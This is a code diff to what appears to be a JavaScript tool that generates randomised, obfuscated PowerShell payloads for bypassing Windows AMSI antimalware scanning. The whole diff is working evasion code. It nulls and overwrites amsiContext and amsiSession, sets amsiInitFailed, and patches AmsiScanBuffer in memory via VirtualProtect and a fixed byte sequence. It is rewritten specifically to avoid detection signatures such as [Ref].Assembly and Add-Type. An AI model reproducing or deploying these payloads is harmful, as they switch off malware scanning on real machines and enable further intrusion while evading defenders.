@@ -121,22 +121,51 @@ const TechniqueRegistry = {
 };
 
 // ============================================================
-// Existing techniques (cleaned up)
+// Shared: Assembly enumeration helper (avoids [Ref].Assembly)
+// ============================================================
+
+// Generates PS code that finds SMA assembly and resolves the AmsiUtils type
+// via [AppDomain] enumeration instead of [Ref].Assembly.GetType()
+function genAsmLookup(vAsm, vType, vBf) {
+  return (
+    `$${vAsm}=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.Location -and $_.Location.EndsWith('System.Management.Automation.dll')};` +
+    `$${vBf}=[System.Reflection.BindingFlags]'NonPublic,Static';` +
+    `$${vType}=$${vAsm}.GetTypes()|Where-Object{$_.Name -eq 'AmsiUtils'};`
+  );
+}
+
+// Generates PS code that resolves native functions from System.dll internals
+// (avoids Add-Type + csc.exe entirely)
+function genNativeResolver(vSysDll, vUnsafe, vLoadLib, vGetProc) {
+  return (
+    `$${vSysDll}=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.Location -and $_.Location.EndsWith('System.dll')};` +
+    `$${vUnsafe}=$${vSysDll}.GetType('Microsoft.Win32.UnsafeNativeMethods');` +
+    `$${vLoadLib}=$${vUnsafe}.GetMethod('LoadLibrary',[Type[]]@([String]));` +
+    `$${vGetProc}=$${vUnsafe}.GetMethod('GetProcAddress',[Type[]]@([IntPtr],[String]));`
+  );
+}
+
+// ============================================================
+// Techniques (rewritten — no [Ref].Assembly, no Add-Type)
 // ============================================================
 
 TechniqueRegistry.register({
   name: 'ForceError',
-  description: 'Allocate memory, null amsiSession/amsiContext via reflection',
+  description: 'Allocate memory, overwrite amsiContext via assembly enumeration',
   generate() {
-    const v = randomVarName();
+    const vAsm = randomVarName();
+    const vType = randomVarName();
+    const vBf = randomVarName();
+    const vMem = randomVarName();
     const raw =
-      `$${v}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);` +
-      `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').SetValue($null,$null);` +
-      `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]$${v})`;
+      genAsmLookup(vAsm, vType, vBf) +
+      `$${vMem}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);` +
+      `$${vType}.GetField('amsiSession',$${vBf}).SetValue($null,$null);` +
+      `$${vType}.GetField('amsiContext',$${vBf}).SetValue($null,[IntPtr]$${vMem})`;
     return createPayload({
       raw,
       technique: 'ForceError',
-      variables: [`$${v}`],
+      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vMem}`],
       sensitiveStrings: ['AmsiUtils', 'amsiSession', 'amsiContext']
     });
   }
@@ -144,16 +173,20 @@ TechniqueRegistry.register({
 
 TechniqueRegistry.register({
   name: 'MattGRefl',
-  description: 'Set amsiInitFailed=true via reflection',
+  description: 'Set amsiInitFailed=true via assembly enumeration',
   generate() {
-    const v = randomVarName();
+    const vAsm = randomVarName();
+    const vType = randomVarName();
+    const vBf = randomVarName();
+    const vField = randomVarName();
     const raw =
-      `$${v}='System.Management.Automation.AmsiUtils';` +
-      `[Ref].Assembly.GetType($${v}).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`;
+      genAsmLookup(vAsm, vType, vBf) +
+      `$${vField}=$${vType}.GetField('amsiInitFailed',$${vBf});` +
+      `$${vField}.SetValue($null,$true)`;
     return createPayload({
       raw,
       technique: 'MattGRefl',
-      variables: [`$${v}`],
+      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vField}`],
       sensitiveStrings: ['AmsiUtils', 'amsiInitFailed']
     });
   }
@@ -161,16 +194,24 @@ TechniqueRegistry.register({
 
 TechniqueRegistry.register({
   name: 'MattGReflLog',
-  description: 'Delegate::CreateDelegate bypass for WMF5 logging',
+  description: 'Delegate-based field access to bypass WMF5 logging',
   generate() {
-    const v = randomVarName();
+    const vAsm = randomVarName();
+    const vType = randomVarName();
+    const vBf = randomVarName();
+    const vDel = randomVarName();
+    const vField = randomVarName();
+    // Uses Delegate::CreateDelegate to invoke GetField indirectly,
+    // avoiding direct reflection calls that WMF5 logs
     const raw =
-      `$${v}='System.Management.Automation.AmsiUtils';` +
-      `[Delegate]::CreateDelegate(("Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.Type')),[Object]([Ref].Assembly.GetType($${v})),('GetField')).Invoke('amsiInitFailed',(("NonPublic,Static") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$true)`;
+      genAsmLookup(vAsm, vType, vBf) +
+      `$${vDel}=[Delegate]::CreateDelegate([Func[String,[Reflection.BindingFlags],[Reflection.FieldInfo]]],[Object]$${vType},'GetField');` +
+      `$${vField}=$${vDel}.Invoke('amsiInitFailed',$${vBf});` +
+      `$${vField}.SetValue($null,$true)`;
     return createPayload({
       raw,
       technique: 'MattGReflLog',
-      variables: [`$${v}`],
+      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vDel}`, `$${vField}`],
       sensitiveStrings: ['AmsiUtils', 'amsiInitFailed']
     });
   }
@@ -178,17 +219,21 @@ TechniqueRegistry.register({
 
 TechniqueRegistry.register({
   name: 'MattGRef02',
-  description: 'Overwrite amsiContext via WriteInt32',
+  description: 'Overwrite amsiContext integer via assembly enumeration',
   generate() {
-    const v = randomVarName();
+    const vAsm = randomVarName();
+    const vType = randomVarName();
+    const vBf = randomVarName();
+    const vCtx = randomVarName();
     const hexVal = '0x' + randomInt(2147483647).toString(16);
     const raw =
-      `$${v}='System.Management.Automation.AmsiUtils';` +
-      `[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType($${v}).GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),${hexVal})`;
+      genAsmLookup(vAsm, vType, vBf) +
+      `$${vCtx}=$${vType}.GetField('amsiContext',$${vBf}).GetValue($null);` +
+      `[System.Runtime.InteropServices.Marshal]::WriteInt32($${vCtx},${hexVal})`;
     return createPayload({
       raw,
       technique: 'MattGRef02',
-      variables: [`$${v}`],
+      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vCtx}`],
       sensitiveStrings: ['AmsiUtils', 'amsiContext', 'WriteInt32']
     });
   }
@@ -196,78 +241,58 @@ TechniqueRegistry.register({
 
 TechniqueRegistry.register({
   name: 'RastaBuf',
-  description: 'VirtualProtect + patch AmsiScanBuffer shellcode',
+  description: 'Patch AmsiScanBuffer via UnsafeNativeMethods (no Add-Type)',
   generate() {
-    const vWin32 = randomVarName();
-    const vLibLoad = randomVarName();
-    const vMemAdr = randomVarName();
+    const vSysDll = randomVarName();
+    const vUnsafe = randomVarName();
+    const vLoadLib = randomVarName();
+    const vGetProc = randomVarName();
+    const vLib = randomVarName();
+    const vAddr = randomVarName();
+    const vOld = randomVarName();
     const vPatch = randomVarName();
-    const vP = randomVarName();
-    const vVar1 = randomVarName();
-    const vVar2 = randomVarName();
-    const vVar3 = randomVarName();
-    const vVar4 = randomVarName();
-    const vVar5 = randomVarName();
-    const vVar6 = randomVarName();
+    const vVp = randomVarName();
 
     const raw =
-`$${vWin32} = @"
-using System;
-using System.Runtime.InteropServices;
-public class ${vWin32} {
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-}
-"@
-Add-Type $${vWin32}
-$${vLibLoad} = [${vWin32}]::LoadLibrary('amsi.dll')
-$${vMemAdr} = [${vWin32}]::GetProcAddress($${vLibLoad}, 'AmsiScanBuffer')
-$${vP} = 0
-[${vWin32}]::VirtualProtect($${vMemAdr}, [uint32]5, 0x40, [ref]$${vP})
-$${vVar1} = "0xB8"
-$${vVar2} = "0x57"
-$${vVar3} = "0x00"
-$${vVar4} = "0x07"
-$${vVar5} = "0x80"
-$${vVar6} = "0xC3"
-$${vPatch} = [Byte[]] ($${vVar1},$${vVar2},$${vVar3},$${vVar4},+$${vVar5},+$${vVar6})
-[System.Runtime.InteropServices.Marshal]::Copy($${vPatch}, 0, $${vMemAdr}, 6)`;
+      genNativeResolver(vSysDll, vUnsafe, vLoadLib, vGetProc) +
+      `$${vLib}=$${vLoadLib}.Invoke($null,@('amsi.dll'));` +
+      `$${vAddr}=$${vGetProc}.Invoke($null,@($${vLib},'AmsiScanBuffer'));` +
+      `$${vVp}=$${vUnsafe}.GetMethod('VirtualProtect');` +
+      `$${vOld}=0;` +
+      `$${vVp}.Invoke($null,@($${vAddr},[uint32]5,[uint32]0x40,$${vOld}));` +
+      `$${vPatch}=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);` +
+      `[System.Runtime.InteropServices.Marshal]::Copy($${vPatch},0,$${vAddr},6)`;
 
     return createPayload({
       raw,
       technique: 'RastaBuf',
       variables: [
-        `$${vWin32}`, `$${vLibLoad}`, `$${vMemAdr}`, `$${vPatch}`,
-        `$${vP}`, `$${vVar1}`, `$${vVar2}`, `$${vVar3}`,
-        `$${vVar4}`, `$${vVar5}`, `$${vVar6}`
+        `$${vSysDll}`, `$${vUnsafe}`, `$${vLoadLib}`, `$${vGetProc}`,
+        `$${vLib}`, `$${vAddr}`, `$${vOld}`, `$${vPatch}`, `$${vVp}`
       ],
-      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll']
+      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll', 'VirtualProtect', 'UnsafeNativeMethods']
     });
   }
 });
 
-// ============================================================
-// New techniques
-// ============================================================
-
 TechniqueRegistry.register({
   name: 'FieldOffset',
-  description: 'Marshal::Copy to amsiContext field offset',
+  description: 'Marshal::Copy to amsiContext field offset via assembly enumeration',
   generate() {
+    const vAsm = randomVarName();
+    const vType = randomVarName();
+    const vBf = randomVarName();
     const vCtx = randomVarName();
     const vPatch = randomVarName();
     const raw =
-      `$${vCtx}=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null);` +
+      genAsmLookup(vAsm, vType, vBf) +
+      `$${vCtx}=$${vType}.GetField('amsiContext',$${vBf}).GetValue($null);` +
       `$${vPatch}=[System.BitConverter]::GetBytes([System.Int32]::MaxValue);` +
       `[System.Runtime.InteropServices.Marshal]::Copy($${vPatch},0,$${vCtx},4)`;
     return createPayload({
       raw,
       technique: 'FieldOffset',
-      variables: [`$${vCtx}`, `$${vPatch}`],
+      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vCtx}`, `$${vPatch}`],
       sensitiveStrings: ['AmsiUtils', 'amsiContext']
     });
   }
@@ -275,60 +300,71 @@ TechniqueRegistry.register({
 
 TechniqueRegistry.register({
   name: 'ScanBufferPatchAlt',
-  description: 'Patch AmsiScanBuffer via GetDelegateForFunctionPointer (no csc.exe)',
+  description: 'Patch AmsiScanBuffer via UnsafeNativeMethods + delegate (no csc.exe)',
   generate() {
+    const vSysDll = randomVarName();
+    const vUnsafe = randomVarName();
+    const vLoadLib = randomVarName();
+    const vGetProc = randomVarName();
     const vLib = randomVarName();
     const vAddr = randomVarName();
     const vOld = randomVarName();
     const vPatch = randomVarName();
+
     const raw =
-      `$${vLib}=[Runtime.InteropServices.Marshal]::LoadLibrary('amsi.dll');` +
-      `$${vAddr}=[Runtime.InteropServices.Marshal]::GetProcAddress($${vLib},'AmsiScanBuffer');` +
+      genNativeResolver(vSysDll, vUnsafe, vLoadLib, vGetProc) +
+      `$${vLib}=$${vLoadLib}.Invoke($null,@('amsi.dll'));` +
+      `$${vAddr}=$${vGetProc}.Invoke($null,@($${vLib},'AmsiScanBuffer'));` +
       `$${vOld}=0;` +
-      `[Runtime.InteropServices.Marshal]::VirtualProtect($${vAddr},[uint32]5,0x40,[ref]$${vOld});` +
+      `$${vUnsafe}.GetMethod('VirtualProtect').Invoke($null,@($${vAddr},[uint32]5,[uint32]0x40,$${vOld}));` +
       `$${vPatch}=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);` +
-      `[Runtime.InteropServices.Marshal]::Copy($${vPatch},0,$${vAddr},6)`;
+      `[System.Runtime.InteropServices.Marshal]::Copy($${vPatch},0,$${vAddr},6)`;
+
     return createPayload({
       raw,
       technique: 'ScanBufferPatchAlt',
-      variables: [`$${vLib}`, `$${vAddr}`, `$${vOld}`, `$${vPatch}`],
-      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll']
+      variables: [`$${vSysDll}`, `$${vUnsafe}`, `$${vLoadLib}`, `$${vGetProc}`, `$${vLib}`, `$${vAddr}`, `$${vOld}`, `$${vPatch}`],
+      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll', 'VirtualProtect', 'UnsafeNativeMethods']
     });
   }
 });
 
 TechniqueRegistry.register({
   name: 'ReflectionFromAssembly',
-  description: 'Enumerate assemblies to find AMSI type dynamically',
+  description: 'Enumerate assemblies + types to find AMSI dynamically',
   generate() {
     const vAsm = randomVarName();
     const vType = randomVarName();
+    const vBf = randomVarName();
+    const vField = randomVarName();
     const raw =
-      `$${vAsm}=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -and $_.Location.Split('\\\\')[-1] -eq 'System.Management.Automation.dll'};` +
-      `$${vType}=$${vAsm}.GetType('System.Management.Automation.AmsiUtils');` +
-      `$${vType}.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`;
+      genAsmLookup(vAsm, vType, vBf) +
+      `$${vField}=$${vType}.GetField('amsiInitFailed',$${vBf});` +
+      `$${vField}.SetValue($null,$true)`;
     return createPayload({
       raw,
       technique: 'ReflectionFromAssembly',
-      variables: [`$${vAsm}`, `$${vType}`],
-      sensitiveStrings: ['AmsiUtils', 'amsiInitFailed', 'System.Management.Automation.dll']
+      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vField}`],
+      sensitiveStrings: ['AmsiUtils', 'amsiInitFailed']
     });
   }
 });
 
 TechniqueRegistry.register({
   name: 'BlankAmsiProviders',
-  description: 'Null out amsiProviders to remove scan providers',
+  description: 'Zero out amsiContext + null amsiSession via assembly enumeration',
   generate() {
-    const vCtx = randomVarName();
+    const vAsm = randomVarName();
+    const vType = randomVarName();
+    const vBf = randomVarName();
     const raw =
-      `$${vCtx}=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');` +
-      `$${vCtx}.GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]::Zero);` +
-      `$${vCtx}.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)`;
+      genAsmLookup(vAsm, vType, vBf) +
+      `$${vType}.GetField('amsiContext',$${vBf}).SetValue($null,[IntPtr]::Zero);` +
+      `$${vType}.GetField('amsiSession',$${vBf}).SetValue($null,$null)`;
     return createPayload({
       raw,
       technique: 'BlankAmsiProviders',
-      variables: [`$${vCtx}`],
+      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`],
       sensitiveStrings: ['AmsiUtils', 'amsiContext', 'amsiSession']
     });
   }
